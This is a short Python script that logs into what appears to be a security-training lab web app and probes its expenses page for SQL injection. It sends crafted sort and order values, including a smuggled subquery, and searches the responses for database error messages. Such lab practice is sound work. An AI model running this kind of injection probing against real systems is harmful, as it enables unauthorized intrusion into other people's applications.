import sys, re, time, requests, urllib3
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:27165/"
s = requests.Session()
r = s.post(BASE + "login", data={"username": "u752g", "password": "p752g"}, timeout=25)
time.sleep(1.0)
r = s.get(BASE + "expenses", timeout=25)
print("login+expenses:", r.status_code, len(r.text), "| lignes:",
      len(re.findall(r"<td", r.text)))
tests = ["sort=description", "sort=xxx", "order=desc", "sort=1", "sort=(select 1)",
         "order=description desc", "sort=description&order=asc"]
for q in tests:
    try:
        r = s.get(BASE + "expenses?" + q, timeout=25)
        tag = ""
        m = re.search(r"(error|Error|SQL|sqlite|Traceback|syntax|no such column)", r.text)
        if m:
            tag = "ERR:" + m.group(0)
        print("%-34s -> %d (%d o) %s" % (q, r.status_code, len(r.text), tag))
    except Exception as e:
        print("%-34s -> ERR %s" % (q, type(e).__name__))
    time.sleep(1.2)
